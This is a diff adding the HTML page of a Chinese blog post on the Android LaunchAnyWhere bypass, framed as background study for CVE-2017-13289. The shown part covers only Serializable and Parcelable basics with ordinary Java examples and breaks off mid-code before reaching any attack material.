@@ -1,0 +1,1065 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+  <meta name="google-site-verification" content="1VSb7KgXA34WGgoVKCCkrkEMjx1Vq8uwVB6FC3iUGV8">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="IPC通信,序列化">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="CVE-2017-13289前置学习">
+<meta name="keywords" content="IPC通信,序列化">
+<meta property="og:type" content="article">
+<meta property="og:title" content="LaunchAnyWhere绕过原理">
+<meta property="og:url" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/index.html">
+<meta property="og:site_name" content="安和桥南丶的博客">
+<meta property="og:description" content="CVE-2017-13289前置学习">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586692247028.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586615251045.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/pf-92jsexpyrb7p2dvi8oj3-vbs.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586702053668.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586703114764.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586703361139.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/tfqafnxzmsfujmq2xyo-kwvbc2g.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586615251045.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586707272153.png">
+<meta property="og:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/PeriodicReport.png">
+<meta property="og:updated_time" content="2020-04-13T08:04:58.411Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="LaunchAnyWhere绕过原理">
+<meta name="twitter:description" content="CVE-2017-13289前置学习">
+<meta name="twitter:image" content="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/1586692247028.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/">
+
+
+
+
+
+  <title>LaunchAnyWhere绕过原理 | 安和桥南丶的博客</title>
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-149847357-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">安和桥南丶的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-schedule">
+          <a href="/schedule/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-calendar"></i> <br>
+            
+            日程表
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/12/LaunchAnyWhere绕过原理/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="安河桥南丶">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="安和桥南丶的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">LaunchAnyWhere绕过原理</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-12T14:46:53+08:00">
+                2020-04-12
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2020/04/12/LaunchAnyWhere绕过原理/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2020/04/12/LaunchAnyWhere绕过原理/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2020/04/12/LaunchAnyWhere绕过原理/" class="leancloud_visitors" data-flag-title="LaunchAnyWhere绕过原理">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  CVE-2017-13289前置学习
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="LaunchAnywhere-&#x7ED5;&#x8FC7;&#x539F;&#x7406;"><a href="#LaunchAnywhere-&#x7ED5;&#x8FC7;&#x539F;&#x7406;" class="headerlink" title="LaunchAnywhere &#x7ED5;&#x8FC7;&#x539F;&#x7406;"></a>LaunchAnywhere &#x7ED5;&#x8FC7;&#x539F;&#x7406;</h1><h2 id="1-&#x7ED5;&#x8FC7;&#x524D;&#x63D0;"><a href="#1-&#x7ED5;&#x8FC7;&#x524D;&#x63D0;" class="headerlink" title="1 &#x7ED5;&#x8FC7;&#x524D;&#x63D0;"></a>1 &#x7ED5;&#x8FC7;&#x524D;&#x63D0;</h2><h3 id="1-1-IPC&#x57FA;&#x7840;&#x6982;&#x5FF5;&#x4ECB;&#x7ECD;"><a href="#1-1-IPC&#x57FA;&#x7840;&#x6982;&#x5FF5;&#x4ECB;&#x7ECD;" class="headerlink" title="1.1 IPC&#x57FA;&#x7840;&#x6982;&#x5FF5;&#x4ECB;&#x7ECD;"></a>1.1 IPC&#x57FA;&#x7840;&#x6982;&#x5FF5;&#x4ECB;&#x7ECD;</h3><h4 id="1-1-1-Serializable&#x63A5;&#x53E3;"><a href="#1-1-1-Serializable&#x63A5;&#x53E3;" class="headerlink" title="1.1.1 Serializable&#x63A5;&#x53E3;"></a>1.1.1 Serializable&#x63A5;&#x53E3;</h4><blockquote>
+<p> Serializable&#x662F;Java&#x63D0;&#x4F9B;&#x7684;&#x4E00;&#x4E2A;&#x5E8F;&#x5217;&#x5316;&#x63A5;&#x53E3;&#xFF0C;&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x7A7A;&#x63A5;&#x53E3;&#xFF0C;&#x4E3A;&#x5BF9;&#x8C61;&#x6807;&#x51C6;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x3002;&#x4F7F;&#x7528;Serializable&#x6765;&#x5B9E;&#x73B0;&#x5E8F;&#x5217;&#x5316;&#x76F8;&#x5F53;&#x7B80;&#x5355;&#xFF0C;&#x4E00;&#x53E5;&#x8BDD;&#x5373;&#x53EF;&#x3002; </p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>{</span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> seriaVersionUID = <span class="number">519067123721295773L</span></span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-1-2-Parcelable&#x63A5;&#x53E3;"><a href="#1-1-2-Parcelable&#x63A5;&#x53E3;" class="headerlink" title="1.1.2  Parcelable&#x63A5;&#x53E3;"></a>1.1.2  Parcelable&#x63A5;&#x53E3;</h4><blockquote>
+<p>Parcel&#x5185;&#x90E8;&#x5305;&#x88C5;&#x4E86;&#x53EF;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;Binder&#x4E2D;&#x81EA;&#x7531;&#x4F20;&#x8F93;&#xFF0C;&#x5728;&#x5E8F;&#x5217;&#x5316;&#x8FC7;&#x7A0B;&#x4E2D;&#x9700;&#x8981;&#x5B9E;&#x73B0;&#x7684;&#x529F;&#x80FD;&#x6709;&#x5E8F;&#x5217;&#x5316;&#x3001;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x548C;&#x5185;&#x5BB9;&#x63CF;&#x8FF0;&#x5E8F;&#x5217;&#x5316;&#x529F;&#x80FD;&#x7531;<code>writeToParcel</code>&#x65B9;&#x6CD5;&#x6765;&#x5B8C;&#x6210;&#xFF0C;&#x6700;&#x7EC8;&#x662F;&#x901A;&#x8FC7;Parcel&#x4E2D;&#x7684;&#x4E00;&#x7CFB;&#x5217;<code>write</code>&#x65B9;&#x6CD5;&#x6765;&#x5B8C;&#x6210;&#x7684;&#x3002; </p>
+</blockquote>
+<h4 id="1-1-3-&#x5982;&#x4F55;&#x5B9E;&#x73B0;Parcelable&#x63A5;&#x53E3;"><a href="#1-1-3-&#x5982;&#x4F55;&#x5B9E;&#x73B0;Parcelable&#x63A5;&#x53E3;" class="headerlink" title="1.1.3 &#x5982;&#x4F55;&#x5B9E;&#x73B0;Parcelable&#x63A5;&#x53E3;"></a>1.1.3 &#x5982;&#x4F55;&#x5B9E;&#x73B0;Parcelable&#x63A5;&#x53E3;</h4><ol>
+<li><p>describeContents&#x65B9;&#x6CD5;:&#x9ED8;&#x8BA4;&#x8FD4;&#x56DE;0&#x5373;&#x53EF;</p>
+</li>
+<li><p>writeToParcel&#x65B9;&#x6CD5;&#xFF1A;&#x8BE5;&#x65B9;&#x6CD5;&#x5C06;&#x7C7B;&#x7684;&#x6570;&#x636E;&#x5199;&#x5165;&#x5916;&#x90E8;&#x63D0;&#x4F9B;&#x7684;Parcel&#x4E2D;&#xFF0C;&#x5373;&#x6253;&#x5305;&#x9700;&#x8981;&#x4F20;&#x8F93;&#x7684;&#x6570;&#x636E;&#x5230;Parcel&#x5BB9;&#x5668;&#x4E2D;&#x4FDD;&#x5B58;&#xFF0C;&#x4E00;&#x904D;&#x4ECE;Parcel&#x5BB9;&#x5668;&#x83B7;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x58F0;&#x660E;&#x5982;&#x4E0B;:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * &#x5C06;&#x5BF9;&#x8C61;&#x8F6C;&#x6362;&#x6210;&#x4E00;&#x4E2A; Parcel &#x5BF9;&#x8C61;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dest &#x8868;&#x793A;&#x8981;&#x5199;&#x5165;&#x7684; Parcel &#x5BF9;&#x8C61;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> flags &#x793A;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x5C06;&#x5982;&#x4F55;&#x5199;&#x5165;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeToParcel</span><span class="params">(Parcel dest, <span class="keyword">int</span> flags)</span> </span>{</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&#x9759;&#x6001;&#x7684;Parcelable.Creator&#x63A5;&#x53E3;&#xFF0C;&#x63A5;&#x53E3;&#x6709;&#x4E24;&#x4E2A;&#x65B9;&#x6CD5;&#xFF1A;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Creator</span>&lt;<span class="title">T</span>&gt; </span>{</span><br><span class="line">     <span class="function"><span class="keyword">public</span> T <span class="title">createFromParcel</span><span class="params">(Parcel source)</span></span>;</span><br><span class="line">     <span class="keyword">public</span> T[] newArray(<span class="keyword">int</span> size);</span><br><span class="line"> }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;Course&gt; CREATOR = <span class="keyword">new</span> Parcelable.Creator&lt;Course&gt;() {</span><br><span class="line">    <span class="comment">//&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5C06;Parcel&#x8FD8;&#x539F;&#x6210;Java&#x5BF9;&#x8C61;</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Course <span class="title">createFromParcel</span><span class="params">(Parcel source)</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Course(source);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//&#x63D0;&#x4F9B;&#x7ED9;&#x5916;&#x90E8;&#x7C7B;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x8FD9;&#x4E2A;&#x6570;&#x7EC4;&#x4F7F;&#x7528;&#x3002;</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Course[] newArray(<span class="keyword">int</span> size) {</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Course[size];</span><br><span class="line">    }</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h3 id="1-2-&#x4E00;&#x4E2A;&#x4F7F;&#x7528;Parcelable&#x7684;&#x4F8B;&#x5B50;"><a href="#1-2-&#x4E00;&#x4E2A;&#x4F7F;&#x7528;Parcelable&#x7684;&#x4F8B;&#x5B50;" class="headerlink" title="1.2 &#x4E00;&#x4E2A;&#x4F7F;&#x7528;Parcelable&#x7684;&#x4F8B;&#x5B50;"></a>1.2 &#x4E00;&#x4E2A;&#x4F7F;&#x7528;Parcelable&#x7684;&#x4F8B;&#x5B50;</h3><h4 id="1-2-1-&#x5C01;&#x88C5;&#x6570;&#x636E;"><a href="#1-2-1-&#x5C01;&#x88C5;&#x6570;&#x636E;" class="headerlink" title="1.2.1 &#x5C01;&#x88C5;&#x6570;&#x636E;"></a>1.2.1 &#x5C01;&#x88C5;&#x6570;&#x636E;</h4><p>&#x628A;&#x5B9E;&#x73B0;parcelable&#x63A5;&#x53E3;&#x7684;Person&#x5BF9;&#x8C61;&#x4F20;&#x9012;&#x5230;TwoActivity&#x91CC;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>{</span><br><span class="line">    <span class="comment">/** Called when the activity is first created. */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>{</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.main);</span><br><span class="line">        <span class="comment">// &#x5C01;&#x88C5;&#x6570;&#x636E;</span></span><br><span class="line">        Person p = <span class="keyword">new</span> Person();</span><br><span class="line">        p.setId(<span class="number">1</span>);</span><br><span class="line">        p.setName(<span class="string">&quot;xiaoming&quot;</span>);</span><br><span class="line">        <span class="comment">// &#x7528;Intent&#x4F20;&#x9012;Person&#x5BF9;&#x8C61;</span></span><br><span class="line">        Intent i = <span class="keyword">new</span> Intent(<span class="keyword">this</span>, TwoActivity.class);</span><br><span class="line">        i.putExtra(<span class="string">&quot;Person&quot;</span>, p);</span><br><span class="line">        startActivity(i);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2-2-TwoActivity-&#x83B7;&#x53D6;&#x6570;&#x636E;"><a href="#1-2-2-TwoActivity-&#x83B7;&#x53D6;&#x6570;&#x636E;" class="headerlink" title="1.2.2 TwoActivity &#x83B7;&#x53D6;&#x6570;&#x636E;"></a>1.2.2 TwoActivity &#x83B7;&#x53D6;&#x6570;&#x636E;</h4><p>&#x83B7;&#x53D6;&#x4ECE;DemoActivity&#x4F20;&#x9012;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x6253;&#x5370;</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TwoActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>{</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        </span><br><span class="line">        Person p = (Person)getIntent().getParcelableExtra(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;p_id&quot;</span>+p.getId());</span><br><span class="line">        System.out.println(<span class="string">&quot;p_name&quot;</span>+p.getName());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-2-3-parcelable&#x63A5;&#x53E3;&#x7684;&#x5B9E;&#x73B0;"><a href="#1-2-3-parcelable&#x63A5;&#x53E3;&#x7684;&#x5B9E;&#x73B0;" class="headerlink" title="1.2.3 parcelable&#x63A5;&#x53E3;&#x7684;&#x5B9E;&#x73B0;"></a>1.2.3 parcelable&#x63A5;&#x53E3;&#x7684;&#x5B9E;&#x73B0;</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> <span class="keyword">implements</span> <span class="title">Parcelable</span></span>{</span><br><span class="line">    <span class="comment">// &#x6210;&#x5458;&#x53D8;&#x91CF;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 1.&#x5FC5;&#x987B;&#x5B9E;&#x73B0;Parcelable.Creator&#x63A5;&#x53E3;,&#x5426;&#x5219;&#x5728;&#x83B7;&#x53D6;Person&#x6570;&#x636E;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x5982;&#x4E0B;&#xFF1A;</span></span><br><span class="line">    <span class="comment">// android.os.BadParcelableException:</span></span><br><span class="line">    <span class="comment">// Parcelable protocol requires a Parcelable.Creator object called  CREATOR on class com.um.demo.Person</span></span><br><span class="line">    <span class="comment">// 2.&#x8FD9;&#x4E2A;&#x63A5;&#x53E3;&#x5B9E;&#x73B0;&#x4E86;&#x4ECE;Percel&#x5BB9;&#x5668;&#x8BFB;&#x53D6;Person&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x8FD4;&#x56DE;Person&#x5BF9;&#x8C61;&#x7ED9;&#x903B;&#x8F91;&#x5C42;&#x4F7F;&#x7528;</span></span><br><span class="line">    <span class="comment">// 3.&#x5B9E;&#x73B0;Parcelable.Creator&#x63A5;&#x53E3;&#x5BF9;&#x8C61;&#x540D;&#x5FC5;&#x987B;&#x4E3A;CREATOR&#xFF0C;&#x4E0D;&#x5982;&#x540C;&#x6837;&#x4F1A;&#x62A5;&#x9519;&#x4E0A;&#x9762;&#x6240;&#x63D0;&#x5230;&#x7684;&#x9519;&#xFF1B;</span></span><br><span class="line">    <span class="comment">// 4.&#x5728;&#x8BFB;&#x53D6;Parcel&#x5BB9;&#x5668;&#x91CC;&#x7684;&#x6570;&#x636E;&#x4E8B;&#xFF0C;&#x5FC5;&#x987B;&#x6309;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x58F0;&#x660E;&#x7684;&#x987A;&#x5E8F;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x51FA;&#x73B0;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x51FA;&#x9519;</span></span><br><span class="line">    <span class="comment">// 5.&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Parcelable.Creator&lt;Person&gt; CREATOR = <span class="keyword">new</span> Creator(){</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Person <span class="title">createFromParcel</span><span class="params">(Parcel source)</span> </span>{</span><br><span class="line">            <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">            <span class="comment">// &#x5FC5;&#x987B;&#x6309;&#x6210;&#x5458;&#x53D8;&#x91CF;&#x58F0;&#x660E;&#x7684;&#x987A;&#x5E8F;&#x8BFB;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x51FA;&#x73B0;&#x83B7;&#x53D6;&#x6570;&#x636E;&#x51FA;&#x9519;</span></span><br><span class="line">            Person p = <span class="keyword">new</span> Person();</span><br><span class="line">            p.setId(source.readInt());</span><br><span class="line">            p.setName(source.readString());</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Person[] newArray(<span class="keyword">int</span> size) {</span><br><span class="line">            <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Person[size];</span><br><span class="line">        }</span><br><span class="line">    };</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>{</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span 